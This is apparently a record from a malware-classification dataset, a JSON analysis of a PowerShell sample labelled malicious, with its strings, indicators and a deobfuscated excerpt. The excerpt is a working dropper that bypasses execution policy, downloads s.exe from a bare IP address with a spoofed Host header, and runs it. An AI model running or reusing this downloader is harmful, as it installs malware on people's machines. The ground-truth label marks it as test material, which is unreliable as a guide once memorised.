@@ -1,0 +1,94 @@
+{
+  "meta": {
+    "quelldatei": "06db102d1c5d9386cd8d13e22237b286e4ecf1869c84cc70f17da0d421ccad3d.ps1",
+    "sha256": "06db102d1c5d9386cd8d13e22237b286e4ecf1869c84cc70f17da0d421ccad3d",
+    "groesse_bytes": 456,
+    "zeilen": 10,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "http://85.192.63.184/s.exe",
+      "Host",
+      "hacktree.org",
+      "user-agent",
+      "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;",
+      "C:\\s.exe"
+    ],
+    "string_anzahl_gesamt": 7,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "http://85.192.63.184/s.exe",
+      "Host",
+      "hacktree.org",
+      "user-agent",
+      "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;",
+      "C:\\s.exe"
+    ],
+    "string_anzahl_gesamt": 7,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "New-Object",
+      "Start-Process"
+    ],
+    "auffaellige_tokens": {
+      "downloadfile": 1,
+      "start_process": 1
+    },
+    "iocs": {
+      "urls": [
+        "http://85.192.63.184/s.exe"
+      ],
+      "ipv4": [
+        "85.192.63.184"
+      ],
+      "pfade": [
+        "C:\\s.exe"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "http://85.192.63.184/s.exe",
+      "Host",
+      "hacktree.org",
+      "user-agent",
+      "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;",
+      "C:\\s.exe"
+    ],
+    "string_anzahl_gesamt": 7,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "New-Object",
+      "Start-Process"
+    ],
+    "auffaellige_tokens": {
+      "downloadfile": 1,
+      "start_process": 1
+    },
+    "iocs": {
+      "urls": [
+        "http://85.192.63.184/s.exe"
+      ],
+      "ipv4": [
+        "85.192.63.184"
+      ],
+      "pfade": [
+        "C:\\s.exe"
+      ]
+    },
+    "deobfuskiert_auszug": "powershell -exec bypass -c\r\n$u=\"http://85.192.63.184/s.exe\";\r\n$p=[System.Net.WebRequest]::GetSystemWebProxy();\r\n$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;\r\n$w=New-Object net.webclient;\r\n$w.Headers.add('Host','hacktree.org')\r\n$w.Headers.add('user-agent', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;')\r\n$w.proxy=$p;\r\n$w.UseDefaultCredentials=$true;\r\n$s=$w.DownloadFile($u,\"C:\\s.exe\");Start-Process \"C:\\s.exe\";",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "Datei von URL herunterladen",
+      "Prozess starten"
+    ]
+  }
+}
